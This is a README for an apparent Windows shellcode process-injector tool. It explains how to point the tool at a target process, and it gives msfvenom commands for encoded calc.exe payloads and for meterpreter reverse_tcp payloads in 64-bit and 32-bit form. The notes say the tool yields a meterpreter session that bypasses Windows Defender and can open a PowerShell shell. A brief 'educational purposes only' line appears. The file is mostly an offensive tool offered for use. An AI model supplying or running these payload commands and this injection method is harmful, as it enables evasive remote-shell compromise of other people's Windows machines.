# Shellcode Process Injector

This project contains two variants of a shellcode injector for Windows that injects shellcode into a specified target process. The two versions differ in how they identify the target process for injection: one uses a hardcoded process name, and the other allows the user to specify a process ID (PID) at runtime (This is more a POC).

## Variants
Update the ShellCode with your own generated one
### Shellcode_ProcessInjector_auto
1. Open the source file and modify the `processName` variable to target the desired process.
2. Compile the program.
3. Run the executable.

### Shellcode_ProcessInjector_manual
1. Compile the program.
2. Run the executable and enter the PID of the target process when prompted.

## ShellCode Generation 
### 64-Bit Version
   - Example of Shellcode generation commands for 64-bit Targets
   - Shellcode used to open `calc.exe`:
     ```c
     msfvenom -p windows/x64/exec cmd=calc.exe -f c -e x64/zutto_dekiru
     ```
   - Shellcode for `windows/x64/meterpreter/reverse_tcp` (64-bit):
     ```c
     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<hostIP> LPORT=<hostPORT> -f c -e x64/zutto_dekiru
     ```

### 32-Bit Version
   - Example of Shellcode generation commands for 32-bit Targets
   - Example shellcode used to open `calc.exe` on a 32-bit application:
     ```c
     msfvenom -p windows/exec cmd=calc.exe -f c -e x86/shikata_ga_nai -b "\x00\x0A\x0D" --smallest
     ```
   - Shellcode for `windows/meterpreter/reverse_tcp` (32-bit):
     ```c
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=<hostIP> LPORT=<hostPORT> -f c -e x86/shikata_ga_nai -b "\x00\x0A\x0D" --smallest
     ```
## Requirements

- Windows OS
- Visual Studio or a compatible C compiler
- `msfvenom` from the Metasploit Framework

## Compilation

To compile the variants, use the following command:

```bash
gcc -o Shellcode_ProcessInjector_auto Shellcode_ProcessInjector_auto.c
gcc -o Shellcode_ProcessInjector_manual Shellcode_ProcessInjector_manual.c
```

## Notes
- Ensure that the target process is running before injecting shellcode.
- This code is intended for educational purposes only. Ensure you have permission to test on any target processes.
- This will let you to get a meterpreter session that Bypasses Windows Defender as of October 2024
- The Meterpreter Session you get will be limited, but you can still get a powershell shell
![image](https://github.com/user-attachments/assets/5c3821b7-67b6-4785-9506-23520e9cb545)



